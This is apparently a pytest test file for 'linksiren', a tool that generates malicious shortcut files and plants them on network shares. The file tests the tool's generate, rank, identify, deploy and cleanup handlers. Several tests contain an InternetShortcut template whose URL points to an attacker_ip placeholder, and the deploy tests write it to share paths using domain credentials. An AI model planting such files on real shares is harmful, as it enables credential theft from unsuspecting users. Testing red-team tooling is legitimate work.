import pytest
from unittest.mock import MagicMock, patch
from pathlib import Path
from linksiren.mode_handlers import (
    handle_generate,
    handle_rank,
    handle_identify,
    handle_deploy,
    handle_cleanup,
)


@pytest.fixture
def args():
    return MagicMock()


@pytest.fixture
def domain():
    return "test_domain"


@pytest.fixture
def username():
    return "test_user"


@pytest.fixture
def password():
    return "test_password"


def test_handle_generate_invalid_payload_name(args):
    args.payload = "invalid_payload.txt"
    with patch("linksiren.mode_handlers.is_valid_payload_name", return_value=False):
        handle_generate(args)
        assert not Path(args.payload).exists()


def test_handle_generate_valid_payload_name(args):
    args.payload = "payload.lnk"
    args.attacker = "attacker_ip"
    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.get_lnk_template", return_value="lnk_template"),
        patch(
            "linksiren.mode_handlers.create_lnk_payload",
            return_value="payload_contents",
        ),
        patch(
            "linksiren.mode_handlers.write_payload_local"
        ) as mock_write_payload_local,
    ):
        handle_generate(args)
        mock_write_payload_local.assert_called_once_with(
            args.payload, "payload_contents"
        )


def test_handle_generate_payload_from_template(args):
    args.payload = "payload.url"
    args.attacker = "attacker_ip"
    template_content = (
        "[InternetShortcut]\n"
        + "URL=http://{attacker_ip}/test\n"
        + "WorkingDirectory=C:\\WINDOWS\\\n"
        + "IconIndex=153\n"
        + "IconFile=C:\\Windows\\System32\\imageres.dll"
    )

    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.Path.open", new_callable=MagicMock) as mock_open,
        patch(
            "linksiren.mode_handlers.write_payload_local"
        ) as mock_write_payload_local,
    ):

        mock_open.return_value.__enter__.return_value.read.return_value = (
            template_content
        )

        handle_generate(args)

        expected_payload_contents = template_content.format(attacker_ip=args.attacker)
        mock_write_payload_local.assert_called_once_with(
            args.payload, expected_payload_contents
        )


def test_handle_rank(args, domain, username, password):
    args.active_threshold = 30
    args.targets = "targets.json"
    args.max_depth = 3
    args.fast = False
    with (
        patch("linksiren.mode_handlers.read_targets", return_value=[]),
        patch("linksiren.mode_handlers.get_sorted_rankings", return_value={}),
        patch("builtins.open", new_callable=MagicMock) as mock_open,
    ):
        handle_rank(args, domain, username, password)
        mock_open.assert_called_once_with(
            "folder_rankings.txt", mode="w", encoding="utf-8"
        )


def test_handle_identify(args, domain, username, password):
    args.active_threshold = 30
    args.targets = "targets.json"
    args.max_depth = 3
    args.fast = False
    args.max_folders_per_target = 5
    with (
        patch("linksiren.mode_handlers.read_targets", return_value=[]),
        patch("linksiren.mode_handlers.get_sorted_rankings", return_value={}),
        patch("linksiren.mode_handlers.filter_targets", return_value=[]),
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):
        handle_identify(args, domain, username, password)
        mock_write_list_to_file.assert_called_once_with([], "folder_targets.txt")


def test_handle_deploy_invalid_payload_name(args, domain, username, password):
    domain = "test_domain"
    username = "test_user"
    password = "test_password"
    args.payload = "invalid_payload.txt"
    with (
        patch(
            "linksiren.mode_handlers.read_targets",
            return_value=["\\\\test_host\\test_share"],
        ),
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=False),
    ):
        handle_deploy(args, domain, username, password)
        assert not Path(args.payload).exists()


def test_handle_deploy_valid_payload_name(args, domain, username, password):
    args.payload = "payload.lnk"
    args.attacker = "attacker_ip"
    args.targets = "targets.json"
    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.read_targets", return_value=[MagicMock()]),
        patch("linksiren.mode_handlers.get_lnk_template", return_value="lnk_template"),
        patch(
            "linksiren.mode_handlers.create_lnk_payload",
            return_value="payload_contents",
        ),
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):
        handle_deploy(args, domain, username, password)
        mock_write_list_to_file.assert_called_once_with([], "payloads_written.txt", "a")


def test_handle_deploy_payload_from_template(args, domain, username, password):
    args.payload = "payload.url"
    args.attacker = "attacker_ip"
    args.targets = "targets.json"
    template_content = (
        "[InternetShortcut]\n"
        + "URL=http://{attacker_ip}/test\n"
        + "WorkingDirectory=C:\\WINDOWS\\\n"
        + "IconIndex=153\n"
        + "IconFile=C:\\Windows\\System32\\imageres.dll"
    )

    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.read_targets", return_value=[MagicMock()]),
        patch("builtins.open", new_callable=MagicMock) as mock_open,
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):

        mock_open.return_value.__enter__.return_value.read.return_value = (
            template_content
        )

        handle_deploy(args, domain, username, password)

        mock_write_list_to_file.assert_called_once_with([], "payloads_written.txt", "a")


def test_handle_deploy_write_payload(args, domain, username, password):
    args.payload = "payload.url"
    args.attacker = "attacker_ip"
    args.targets = "targets.json"
    template_content = (
        "[InternetShortcut]\n"
        + "URL=http://{attacker_ip}/test\n"
        + "WorkingDirectory=C:\\WINDOWS\\\n"
        + "IconIndex=153\n"
        + "IconFile=C:\\Windows\\System32\\imageres.dll"
    )
    mock_target = MagicMock()
    mock_target.host = "test_host"
    mock_target.paths = ["test_path"]

    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.read_targets", return_value=[mock_target]),
        patch("builtins.open", new_callable=MagicMock) as mock_open,
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):

        mock_open.return_value.__enter__.return_value.read.return_value = (
            template_content
        )
        mock_target.write_payload.return_value = True

        handle_deploy(args, domain, username, password)

        expected_payload_contents = template_content.format(attacker_ip=args.attacker)
        mock_target.write_payload.assert_called_once_with(
            path="test_path",
            payload_name=args.payload,
            payload=expected_payload_contents,
        )
        mock_write_list_to_file.assert_called_once_with(
            [r"\\test_host\test_path"], "payloads_written.txt", "a"
        )


def test_handle_cleanup(args, domain, username, password):
    args.payload = "payload.url"
    mock_target = MagicMock()
    mock_target.host = "test_host"
    mock_target.paths = ["test_path"]

    with patch("linksiren.mode_handlers.read_targets", return_value=[mock_target]):
        handle_cleanup(args, domain, username, password)
        mock_target.connect.assert_called_once_with(
            user=username, password=password, domain=domain
        )
        mock_target.delete_payload.assert_called_once_with("test_path", args.payload)


def test_handle_cleanup_multiple_targets(args, domain, username, password):
    args.payload = "payload.url"
    mock_target1 = MagicMock()
    mock_target1.host = "test_host1"
    mock_target1.paths = ["test_path1"]
    mock_target2 = MagicMock()
    mock_target2.host = "test_host2"
    mock_target2.paths = ["test_path2"]

    with patch(
        "linksiren.mode_handlers.read_targets",
        return_value=[mock_target1, mock_target2],
    ):
        handle_cleanup(args, domain, username, password)
        mock_target1.connect.assert_called_once_with(
            user=username, password=password, domain=domain
        )
        mock_target1.delete_payload.assert_called_once_with("test_path1", args.payload)
        mock_target2.connect.assert_called_once_with(
            user=username, password=password, domain=domain
        )
        mock_target2.delete_payload.assert_called_once_with("test_path2", args.payload)


def test_handle_cleanup_no_targets(args, domain, username, password):
    args.payload = "payload.url"

    with patch("linksiren.mode_handlers.read_targets", return_value=[]):
        handle_cleanup(args, domain, username, password)
        # No targets to connect or delete payload from, so no assertions needed
